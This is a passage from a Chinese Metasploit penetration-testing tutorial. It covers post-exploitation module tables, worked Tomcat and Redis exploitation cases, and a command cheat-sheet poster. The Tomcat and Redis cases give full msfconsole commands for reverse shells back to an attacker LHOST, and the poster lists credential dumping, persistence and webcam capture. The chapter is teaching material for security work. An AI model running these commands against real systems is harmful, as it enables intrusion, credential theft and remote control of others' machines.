fill="#0ea5e9" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">信息收集</text>  <text x="198" y="190" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">post/windows/gather/enum_applications</text>  <text x="628" y="190" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">列出安装过的所有软件找杀软/数据库</text>  <rect x="60" y="200" width="120" height="30" fill="#111c35" stroke="#334155"/>  <rect x="190" y="200" width="420" height="30" fill="#111c35" stroke="#334155"/>  <rect x="620" y="200" width="400" height="30" fill="#111c35" stroke="#334155"/>  <text x="120.0" y="220" text-anchor="middle" fill="#0ea5e9" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">信息收集</text>  <text x="198" y="220" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">post/windows/gather/enum_shares</text>  <text x="628" y="220" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">枚举本机共享 / 域共享列表 SYSVOL/NETLOGON</text>  <rect x="60" y="230" width="120" height="30" fill="#0b1530" stroke="#334155"/>  <rect x="190" y="230" width="420" height="30" fill="#0b1530" stroke="#334155"/>  <rect x="620" y="230" width="400" height="30" fill="#0b1530" stroke="#334155"/>  <text x="120.0" y="250" text-anchor="middle" fill="#ef4444" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">本地提权</text>  <text x="198" y="250" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">post/windows/gather/suggest_exploits</text>  <text x="628" y="250" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">自动匹配 CVE 提权方案（CVE 2024/2023）</text>  <rect x="60" y="260" width="120" height="30" fill="#111c35" stroke="#334155"/>  <rect x="190" y="260" width="420" height="30" fill="#111c35" stroke="#334155"/>  <rect x="620" y="260" width="400" height="30" fill="#111c35" stroke="#334155"/>  <text x="120.0" y="280" text-anchor="middle" fill="#ef4444" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">本地提权</text>  <text x="198" y="280" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">exploit/windows/local/bypassuac_eventvwr</text>  <text x="628" y="280" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">绕过 UAC 从普通用户-&gt;管理员权限</text>  <rect x="60" y="290" width="120" height="30" fill="#0b1530" stroke="#334155"/>  <rect x="190" y="290" width="420" height="30" fill="#0b1530" stroke="#334155"/>  <rect x="620" y="290" width="400" height="30" fill="#0b1530" stroke="#334155"/>  <text x="120.0" y="310" text-anchor="middle" fill="#ef4444" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">本地提权</text>  <text x="198" y="310" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">exploit/windows/local/cve_2024_21722</text>  <text x="628" y="310" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Win11/2024 最新内核提权 RCE</text>  <rect x="60" y="320" width="120" height="30" fill="#111c35" stroke="#334155"/>  <rect x="190" y="320" width="420" height="30" fill="#111c35" stroke="#334155"/>  <rect x="620" y="320" width="400" height="30" fill="#111c35" stroke="#334155"/>  <text x="120.0" y="340" text-anchor="middle" fill="#8b5cf6" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">凭证抓取</text>  <text x="198" y="340" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">post/windows/gather/hashdump</text>  <text x="628" y="340" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">导出 SAM+SYSTEM 的 NTLM 哈希（本地）</text>  <rect x="60" y="350" width="120" height="30" fill="#0b1530" stroke="#334155"/>  <rect x="190" y="350" width="420" height="30" fill="#0b1530" stroke="#334155"/>  <rect x="620" y="350" width="400" height="30" fill="#0b1530" stroke="#334155"/>  <text x="120.0" y="370" text-anchor="middle" fill="#8b5cf6" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">凭证抓取</text>  <text x="198" y="370" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">post/windows/gather/smart_hashdump</text>  <text x="628" y="370" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">自动导出域 + 本地所有 hash</text>  <rect x="60" y="380" width="120" height="30" fill="#111c35" stroke="#334155"/>  <rect x="190" y="380" width="420" height="30" fill="#111c35" stroke="#334155"/>  <rect x="620" y="380" width="400" height="30" fill="#111c35" stroke="#334155"/>  <text x="120.0" y="400" text-anchor="middle" fill="#8b5cf6" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">凭证抓取</text>  <text x="198" y="400" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">post/windows/gather/credentials/wdigest</text>  <text x="628" y="400" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">抓内存明文密码（Win 2003/2008 老机器）</text>  <rect x="60" y="410" width="120" height="30" fill="#0b1530" stroke="#334155"/>  <rect x="190" y="410" width="420" height="30" fill="#0b1530" stroke="#334155"/>  <rect x="620" y="410" width="400" height="30" fill="#0b1530" stroke="#334155"/>  <text x="120.0" y="430" text-anchor="middle" fill="#10b981" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">横向移动</text>  <text x="198" y="430" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">exploit/windows/smb/psexec</text>  <text x="628" y="430" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">哈希传递 打域内同账号机器</text>  <rect x="60" y="440" width="120" height="30" fill="#111c35" stroke="#334155"/>  <rect x="190" y="440" width="420" height="30" fill="#111c35" stroke="#334155"/>  <rect x="620" y="440" width="400" height="30" fill="#111c35" stroke="#334155"/>  <text x="120.0" y="460" text-anchor="middle" fill="#10b981" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">横向移动</text>  <text x="198" y="460" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">exploit/windows/smb/ms17_010_psexec</text>  <text x="628" y="460" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">永恒之蓝 psexec 版批量</text>  <rect x="60" y="470" width="120" height="30" fill="#0b1530" stroke="#334155"/>  <rect x="190" y="470" width="420" height="30" fill="#0b1530" stroke="#334155"/>  <rect x="620" y="470" width="400" height="30" fill="#0b1530" stroke="#334155"/>  <text x="120.0" y="490" text-anchor="middle" fill="#10b981" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">横向移动</text>  <text x="198" y="490" font-size="10" fill="#fde68a" font-family="Consolas,Monospace">exploit/windows/winrm/winrm_script_exec</text>  <text x="628" y="490" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">WinRM 远程执行（5985/5986）</text>  <text x="540.0" y="510" text-anchor="middle" font-size="12" fill="#64748b" font-family="Microsoft YaHei,Arial">跑前先 sessions -i 进入对应会话；use 模块后只需要 set SESSION &lt;id&gt; 然后 run</text>
</svg>


### 场景说明

Tomcat管理后台存在弱口令，可以通过WAR部署功能上传恶意代码。

### 检测Tomcat

```msf
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS target.example.com
set RPORT 8080
set USERNAME tomcat
set PASSWORD tomcat
run
```

### 利用Tomcat

```msf
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS target.example.com
set RPORT 8080
set HttpUsername tomcat
set HttpPassword tomcat
set PAYLOAD java/jsp_shell_reverse_tcp
set LHOST 192.168.1.100
run
```

---

## 3.15 实战案例：Redis未授权访问

### 漏洞简介

Redis默认无认证，如果暴露在公网，可能被攻击者利用。

### 利用Redis

```msf
use exploit/linux/redis/redis_unauth_exec
set RHOSTS 192.168.1.1
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.1.100
run
```

---

## 总结


<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 560" width="100%" style="max-width:1080px;margin:12px auto;display:block;background:#05091a;border-radius:14px;border:1px solid #1e3a8a">
  <defs>
    <linearGradient id="s22g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0f172a"/></linearGradient>
    <linearGradient id="s22b" x1="0" x2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="s22r" x1="0" x2="1"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f97316"/></linearGradient>
    <marker id="s22a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker>
    <filter id="s22s" x="-20%" y="-20%" width="140%" height="140%"><feDropShadow dx="0" dy="3" stdDeviation="4" flood-color="#000" flood-opacity="0.45"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="520" fill="url(#s22g)"/>
  <text x="540.0" y="44" text-anchor="middle" font-size="22" font-weight="700" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">图 3-22 MSF 终极速查海报：9 张卡牌 贴显示器（看完秒老手）</text>  <text x="540.0" y="74" text-anchor="middle" font-size="13" fill="#94a3b8" font-family="Microsoft YaHei,Arial">99% 日常命令都在 9 张卡中；任何场景翻一翻=3 秒写出完整命令</text>  <rect x="40" y="105" width="325" height="130" rx="12" fill="#0f172a" stroke="#0ea5e9" stroke-width="2"/>  <rect x="40" y="105" width="325" height="28" rx="12" fill="#0ea5e9" opacity="0.25"/>  <text x="60" y="123" font-size="13" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① 搜索模块卡</text>  <text x="56" y="157" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ search CVE-2024-xxxx</text>  <text x="56" y="175" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ search type:exploit platform:win app:tomcat</text>  <text x="56" y="193" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ search rank:excellent</text>  <text x="56" y="211" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ search name:struts2</text>  <rect x="375" y="105" width="325" height="130" rx="12" fill="#0f172a" stroke="#ef4444" stroke-width="2"/>  <rect x="375" y="105" width="325" height="28" rx="12" fill="#ef4444" opacity="0.25"/>  <text x="395" y="123" font-size="13" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">② 漏洞使用卡</text>  <text x="391" y="157" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ use exploit/...</text>  <text x="391" y="175" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ show options/targets/payloads</text>  <text x="391" y="193" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ set RHOSTS/LHOST/LPORT</text>  <text x="391" y="211" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ check → exploit -j -z</text>  <rect x="710" y="105" width="325" height="130" rx="12" fill="#0f172a" stroke="#f59e0b" stroke-width="2"/>  <rect x="710" y="105" width="325" height="28" rx="12" fill="#f59e0b" opacity="0.25"/>  <text x="730" y="123" font-size="13" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">③ 生成载荷卡</text>  <text x="726" y="157" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ msfvenom -p win/x64/meterpreter/reverse_tcp ...</text>  <text x="726" y="175" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ msfvenom -p linux/x64/...</text>  <text x="726" y="193" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ msfvenom -p java/... -f war</text>  <text x="726" y="211" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ msfvenom -p php/... -f raw</text>  <rect x="40" y="245" width="325" height="130" rx="12" fill="#0f172a" stroke="#8b5cf6" stroke-width="2"/>  <rect x="40" y="245" width="325" height="28" rx="12" fill="#8b5cf6" opacity="0.25"/>  <text x="60" y="263" font-size="13" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">④ Handler 监听卡</text>  <text x="56" y="297" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ use exploit/multi/handler</text>  <text x="56" y="315" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ set payload windows/x64/...</text>  <text x="56" y="333" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ set LHOST 0.0.0.0 LPORT 443</text>  <text x="56" y="351" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ run -j（后台持续监听）</text>  <rect x="375" y="245" width="325" height="130" rx="12" fill="#0f172a" stroke="#10b981" stroke-width="2"/>  <rect x="375" y="245" width="325" height="28" rx="12" fill="#10b981" opacity="0.25"/>  <text x="395" y="263" font-size="13" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">⑤ Meterpreter 卡</text>  <text x="391" y="297" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ getsystem ; hashdump</text>  <text x="391" y="315" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ load kiwi → creds_all</text>  <text x="391" y="333" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ portfwd add -L...</text>  <text x="391" y="351" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ screenshot / webcam_snap</text>  <rect x="710" y="245" width="325" height="130" rx="12" fill="#0f172a" stroke="#a855f7" stroke-width="2"/>  <rect x="710" y="245" width="325" height="28" rx="12" fill="#a855f7" opacity="0.25"/>  <text x="730" y="263" font-size="13" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">⑥ 侦察 Aux 卡</text>  <text x="726" y="297" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ auxiliary/scanner/portscan/tcp</text>  <text x="726" y="315" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ auxiliary/scanner/smb/smb_version</text>  <text x="726" y="333" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ auxiliary/scanner/ssh/ssh_login</text>  <text x="726" y="351" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ auxiliary/scanner/http/tomcat_mgr_login</text>  <rect x="40" y="385" width="325" height="130" rx="12" fill="#0f172a" stroke="#06b6d4" stroke-width="2"/>  <rect x="40" y="385" width="325" height="28" rx="12" fill="#06b6d4" opacity="0.25"/>  <text x="60" y="403" font-size="13" font-weight="800" fill="#06b6d4" font-family="Microsoft YaHei,Arial">⑦ 后渗透 Post 卡</text>  <text x="56" y="437" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ post/win/gather/hashdump</text>  <text x="56" y="455" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ post/win/gather/smart_hashdump</text>  <text x="56" y="473" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ post/win/gather/suggest_exploits</text>  <text x="56" y="491" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ post/win/manage/persistence_exe</text>  <rect x="375" y="385" width="325" height="130" rx="12" fill="#0f172a" stroke="#ec4899" stroke-width="2"/>  <rect x="375" y="385" width="325" height="28" rx="12" fill="#ec4899" opacity="0.25"/>  <text x="395" y="403" font-size="13" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">⑧ 数据库卡</text>  <text x="391" y="437" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ msfdb init ; db_status</text>  <text x="391" y="455" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ db_nmap -sV -O 网段</text>  <text x="391" y="473" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ hosts -R ; services -p 445</text>  <text x="391" y="491" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ creds -O / loot / vulns</text>  <rect x="710" y="385" width="325" height="130" rx="12" fill="#0f172a" stroke="#dc2626" stroke-width="2"/>  <rect x="710" y="385" width="325" height="28" rx="12" fill="#dc2626" opacity="0.25"/>  <text x="730" y="403" font-size="13" font-weight="800" fill="#dc2626" font-family="Microsoft YaHei,Arial">⑨ 横向移动卡</text>  <text x="726" y="437" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ exploit/windows/smb/psexec</text>  <text x="726" y="455" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ exploit/win/winrm/winrm_script_exec</text>  <text x="726" y="473" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ use auxiliary/scanner/smb/smb_login</text>  <text x="726" y="491" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">▸ exploit/mssql... (xp_cmdshell)</text>  <text x="540.0" y="520" text-anchor="middle" font-size="12" fill="#64748b" font-family="Microsoft YaHei,Arial">学 Metasploit 三部曲：①先背命令卡 → ②跑 3 个实战案例 → ③写 2 个自定义模块=出师</text>
</svg>


本章详细介绍了Metasploit的使用：

1. **安装配置**：Kali/Windows/Linux安装方法
2. **架构理解**：六大模块详解
3. **命令使用**：MSFconsole命令详解
4. **Payload生成**：MSFvenom使用详解
5. **Meterpreter**：会话管理和后渗透
6. **实战案例**：永恒之蓝、Struts2、Tomcat、Redis

Metasploit是渗透测试的核心工具，掌握它能够极大提高渗透测试效率。

下一章我们将学习SQLMap——SQL注入自动化工具！